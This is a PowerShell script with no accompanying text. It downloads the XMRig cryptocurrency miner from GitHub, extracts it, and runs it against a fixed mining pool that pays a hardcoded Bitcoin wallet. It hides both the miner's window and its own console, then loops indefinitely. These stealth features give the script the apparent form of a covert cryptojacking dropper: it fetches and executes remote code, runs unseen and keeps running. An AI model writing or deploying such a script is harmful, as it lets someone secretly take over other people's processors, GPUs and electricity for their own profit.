# Paths
$minerDir = "C:\Miners"
$zipPath = "$minerDir\xmrig.zip"
$exePath = "$minerDir\xmrig\xmrig.exe"
$logFilePath = "$minerDir\Logs\mining_log.txt"

# Create required directories
if (-not (Test-Path $minerDir)) { New-Item -Path $minerDir -ItemType Directory | Out-Null }
if (-not (Test-Path "$minerDir\Logs")) { New-Item -Path "$minerDir\Logs" -ItemType Directory | Out-Null }

# Download latest XMRig release from GitHub
if (-not (Test-Path $exePath)) {
    Write-Output "[$(Get-Date)] Downloading latest XMRig..." | Tee-Object -FilePath $logFilePath -Append

    $apiUrl = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
    $release = Invoke-RestMethod -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }

    $asset = $release.assets | Where-Object { $_.name -match "win64.*zip" }
    $downloadUrl = $asset.browser_download_url

    Write-Output "[$(Get-Date)] Downloading: $downloadUrl" | Tee-Object -FilePath $logFilePath -Append
    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath

    # Extract
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, "$minerDir\xmrig")

    Remove-Item $zipPath
    Write-Output "[$(Get-Date)] XMRig downloaded and extracted." | Tee-Object -FilePath $logFilePath -Append
} else {
    Write-Output "[$(Get-Date)] XMRig already exists." | Tee-Object -FilePath $logFilePath -Append
}

# Mining configuration
$cpuThreads = 2
$arguments = "--cpu-threads $cpuThreads --cpu-threads-intensity 1 --pool rx.unmineable.com:3333 --wallet BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.unmineable_miner_iahxfi --password x --disable-msr --disable-huge-pages --randomx-no-1gb-pages --no-cpu-affinity --extended-log --api-enable --api-port 60130"

# Check GPU availability
$gpuCheck = Get-WmiObject Win32_VideoController
if ($gpuCheck) {
    Write-Output "[$(Get-Date)] GPU found. Enabling GPU mining." | Tee-Object -FilePath $logFilePath -Append
    $arguments += " --cuda --cuda-devices 0 --cuda-bfactor 1 --cuda-lan 1 --cuda-threads 2"
} else {
    Write-Output "[$(Get-Date)] No GPU detected. Using CPU only." | Tee-Object -FilePath $logFilePath -Append
}

# Start the miner with logging
Write-Output "[$(Get-Date)] Starting miner process..." | Tee-Object -FilePath $logFilePath -Append
Start-Process -FilePath $exePath -ArgumentList $arguments -WindowStyle Hidden `
    -RedirectStandardOutput $logFilePath -RedirectStandardError $logFilePath

# Hide PowerShell window
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$consolePtr = [Win32]::GetConsoleWindow()
[Win32]::ShowWindow($consolePtr, 0)  # 0 = hide

# Keep script alive
while ($true) {
    Start-Sleep -Seconds 60
}
